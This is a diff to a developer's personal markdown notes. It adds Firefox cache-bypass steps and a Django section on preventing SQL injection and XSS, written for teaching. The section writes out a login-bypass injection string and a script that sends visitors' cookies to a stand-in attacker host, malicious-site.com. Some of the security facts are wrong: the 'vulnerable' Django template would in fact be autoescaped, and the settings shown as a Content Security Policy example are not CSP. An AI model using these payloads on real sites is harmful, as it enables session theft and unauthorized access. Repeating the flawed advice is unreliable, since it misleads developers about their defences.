@@ -759,7 +759,27 @@ Remember to secure your Django Admin by configuring the `ADMIN` settings in your
 
 [Disable logging](https://stackoverflow.com/questions/5255657/how-can-i-disable-logging-while-running-unit-tests-in-python-django)
 
-### Other stuffs
+## Javascript
+In Firefox Developer Tools, you can force the browser to reload JavaScript and bypass the cache by following these steps:
+
+1. **Open Developer Tools:**
+   - Right-click on the page and select "Inspect" from the context menu.
+   - Alternatively, you can press `Ctrl + Shift + I` (Windows/Linux) or `Cmd + Option + I` (Mac) to open Developer Tools.
+
+2. **Go to the "Network" tab:**
+   - In the Developer Tools panel, navigate to the "Network" tab.
+
+3. **Enable "Disable Cache":**
+   - At the top of the Network tab, there is a checkbox labeled "Disable Cache." Make sure this checkbox is checked. This ensures that the browser won't use cached resources, including JavaScript files.
+
+4. **Reload the page:**
+   - Press `Ctrl + R` (Windows/Linux) or `Cmd + R` (Mac) to reload the page.
+
+By disabling the cache in the Network tab, you force the browser to fetch all resources, including JavaScript files, from the server instead of using the cached versions.
+
+Alternatively, you can use a hard refresh to clear the cache. You can do this by pressing `Ctrl + Shift + R` (Windows/Linux) or `Cmd + Shift + R` (Mac) instead of a regular reload.
+
+These steps should help you ensure that your JavaScript changes are loaded without relying on cached versions.
 
 ## Javascript (SPA)
 
@@ -885,3 +905,138 @@ In this example:
 Make sure to use the `L` prefix before the string and character literals to denote wide strings and characters.
 
 Note that the actual support for Unicode characters depends on the terminal emulator and the font being used. Some terminals and fonts may not display all Unicode characters correctly, so you might need to configure your terminal settings accordingly. Additionally, your source code file should be saved in a Unicode-compatible encoding (such as UTF-8) to handle Unicode literals properly.
+
+
+Django, a popular Python web framework, includes built-in features and best practices to help protect your application against SQL injections and Cross-Site Scripting (XSS) attacks. Here are some recommendations:
+
+### Protection Against SQL Injections:
+
+1. **Use Django's ORM (Object-Relational Mapping):**
+   Django's ORM helps in preventing SQL injection attacks by automatically escaping parameters in queries. Instead of using raw SQL queries, utilize the ORM for database interactions.
+
+   ```python
+   # Example of using Django ORM
+   from myapp.models import MyModel
+
+   data = MyModel.objects.filter(name=user_input)
+   ```
+
+2. **Parameterized Queries:**
+   If you need to use raw SQL, use parameterized queries to ensure that user inputs are treated as parameters rather than being directly embedded in the SQL statement.
+
+   ```python
+   # Example of using parameterized queries
+   cursor.execute("SELECT * FROM mytable WHERE column = %s", [user_input])
+   ```
+
+3. **Avoid Dynamic SQL Queries:**
+   Avoid constructing dynamic SQL queries by concatenating strings. This practice can make your application vulnerable to injection attacks.
+
+### Protection Against XSS:
+
+1. **Template System Escaping:**
+   Django's template system automatically escapes variables by default. This helps prevent the execution of malicious scripts in the browser.
+
+   ```html
+   <!-- Example of template system escaping -->
+   <p>{{ user_input }}</p>
+   ```
+
+2. **Safe HTML Output:**
+   If you need to output HTML that you know is safe, use the `|safe` filter. However, use this cautiously and only when you are sure that the content is safe.
+
+   ```html
+   <!-- Example of using the |safe filter -->
+   <p>{{ user_input|safe }}</p>
+   ```
+
+3. **Use the `mark_safe` Function:**
+   If you need to mark a string as safe in Python code, use the `mark_safe` function.
+
+   ```python
+   from django.utils.safestring import mark_safe
+
+   safe_html = mark_safe("<p>This is safe HTML</p>")
+   ```
+
+4. **Content Security Policy (CSP):**
+   Implement Content Security Policy headers in your web application to control the sources from which certain types of content can be loaded.
+
+   ```python
+   # Example of setting Content Security Policy in Django settings
+   SECURE_CONTENT_TYPE_NOSNIFF = True
+   SECURE_BROWSER_XSS_FILTER = True
+   ```
+
+By following these best practices and leveraging Django's built-in security features, you can significantly reduce the risk of SQL injections and XSS attacks in your web applications. Regularly update Django and its dependencies to ensure that you benefit from the latest security patches.
+
+### Example of SQL injection:
+
+A SQL injection occurs when an attacker is able to manipulate a SQL query by injecting malicious SQL code into input fields or parameters. Here's a simplified example to illustrate the concept:
+
+Consider a simple login system with the following SQL query to check user credentials:
+
+```sql
+SELECT * FROM users WHERE username = 'input_username' AND password = 'input_password';
+```
+
+In this query, `input_username` and `input_password` are placeholders for user input. Now, imagine a user tries to log in with the following input:
+
+**Username:** `admin' OR '1'='1' --`
+
+When this input is substituted into the SQL query, it becomes:
+
+```sql
+SELECT * FROM users WHERE username = 'admin' OR '1'='1' --' AND password = 'input_password';
+```
+
+The `--` in SQL is used for comments, so everything after `--` is ignored. In this case, the injected code causes the query to return all rows from the `users` table because the condition `'1'='1'` is always true.
+
+This allows an attacker to bypass the login mechanism and gain unauthorized access. In a real-world scenario, an attacker might extract sensitive information, delete records, or perform other malicious actions.
+
+To prevent SQL injections, it's crucial to use parameterized queries or an Object-Relational Mapping (ORM) framework like Django's, as they automatically handle input sanitization and avoid direct string concatenation for constructing SQL queries.
+
+### Example of XSS:
+
+Cross-Site Scripting (XSS) attacks involve injecting malicious scripts into web pages that are then viewed by other users. These scripts can be used to steal information, manipulate the content of a web page, or perform other malicious activities on behalf of the user unknowingly. Here's a simplified example to illustrate an XSS attack:
+
+Suppose you have a web application that displays user comments. The comments are displayed on the page without proper input validation and escaping.
+
+**Vulnerable HTML Code:**
+
+```html
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Comment Page</title>
+</head>
+<body>
+    <div>
+        <h1>User Comments</h1>
+        <ul>
+            <!-- User comments are displayed without proper validation -->
+            {% for comment in comments %}
+                <li>{{ comment.text }}</li>
+            {% endfor %}
+        </ul>
+    </div>
+</body>
+</html>
+```
+
+In this example, the `{{ comment.text }}` variable is directly inserted into the HTML without proper escaping.
+
+Now, consider a user who posts a comment with the following content:
+
+```html
+<script>
+    // Malicious script to steal user cookies
+    const maliciousScript = new Image();
+    maliciousScript.src = 'https://malicious-site.com/steal?cookie=' + document.cookie;
+    document.body.appendChild(maliciousScript);
+</script>
+```
+
+When this comment is displayed on the web page, the script will be executed in the context of other users viewing the page. The script, in this case, tries to steal the user's cookies and send them to a malicious site.
+
+To prevent XSS attacks, you should always sanitize and escape user-generated content before rendering it in HTML. In Django, for example, you can use the `|safe` filter cautiously for content that you know is safe, but it's generally better to rely on automatic escaping provided by the template system. Additionally, implementing Content Security Policy (CSP) headers can further mitigate the impact of XSS attacks by restricting the sources from which scripts can be executed.
